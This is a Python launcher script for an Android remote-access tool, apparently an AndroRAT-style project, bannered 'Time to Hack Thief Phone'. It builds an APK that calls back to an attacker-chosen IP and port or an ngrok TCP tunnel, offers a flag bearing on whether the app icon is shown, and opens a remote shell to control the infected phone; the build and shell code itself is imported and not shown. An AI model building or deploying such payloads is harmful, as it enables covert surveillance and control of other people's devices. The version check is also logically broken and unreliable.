#!/usr/bin/python
# -*- coding: utf-8 -*-

from utils import *
import argparse
import sys
import platform


try:
    from pyngrok import ngrok, conf
except ImportError:
    print(stdOutput("error") + "pyngrok not found.")
    print(stdOutput("info") + "Run 'pip3 install -r requirements.txt'.")
    sys.exit()
    
clearDirec()

# Introduction banner   
 #######                                                                
    #    # #    # ######    #####  ####     #    #   ##    ####  #    # 
    #    # ##  ## #           #   #    #    #    #  #  #  #    # #   #  
    #    # # ## # #####       #   #    #    ###### #    # #      ####   
    #    # #    # #           #   #    #    #    # ###### #      #  #   
    #    # #    # #           #   #    #    #    # #    # #    # #   #  
    #    # #    # ######      #    ####     #    # #    #  ####  #    # 
                                                                        
                                                                        
 ##### #    # ###### # #####     #####  #    #  ####  #    # ######     
   #   #    # #      # #    #    #    # #    # #    # ##   # #          
   #   ###### #####  # #    #    #    # ###### #    # # #  # #####      
   #   #    # #      # #####     #####  #    # #    # #  # # #          
   #   #    # #      # #   #     #      #    # #    # #   ## #          
   #   #    # ###### # #    #    #      #    #  ####  #    # ######                                                        
#                                             By Mobile Security Team 15


# Argument parser setup
parser = argparse.ArgumentParser(description="Remote Android Management Tool")
parser.add_argument('--build', help='Build the apk.', action='store_true')
parser.add_argument('--shell', help='Start the interpreter shell.', action='store_true')
parser.add_argument('--ngrok', help='Use ngrok for tunneling.', action='store_true')
parser.add_argument('-i', '--ip', metavar="<IP>", type=str, help='Enter the IP address.')
parser.add_argument('-p', '--port', metavar="<Port>", type=str, help='Enter the port number.')
parser.add_argument('-o', '--output', metavar="<Apk Name>", type=str, help='Enter the APK name.')
parser.add_argument('-icon', '--icon', help='Set the app icon as visible.', action='store_true')
args = parser.parse_args()


# Check Python version
if float(platform.python_version()[:3]) < 3.6 and float(platform.python_version()[:3]) > 3.11 :
    print(stdOutput("error")+"Python version should be between 3.6> to <3.11")
    sys.exit()

   
# Build APK
if args.build:
    icon = args.icon is not None
    port_ = args.port or 8000
    if args.ngrok:
            conf.get_default().monitor_thread = False
            tcp_tunnel = ngrok.connect(port_, "tcp")
            domain, port = tcp_tunnel.public_url[6:].split(":")
            ip = socket.gethostbyname(domain)
            print(stdOutput("info") + f"Tunnel_IP: {ip} PORT: {port}")
            build(ip, port, args.output, True, port_, icon)
    elif args.ip and args.port:
        build(args.ip, args.port, args.output, False, None, icon)
    else:
        print(stdOutput("error") + "Arguments missing for building APK.")

# Start shell
elif args.shell:
    if args.ip and args.port:
        get_shell(args.ip, args.port)
    else:
        print(stdOutput("error") + "Arguments missing for starting shell.")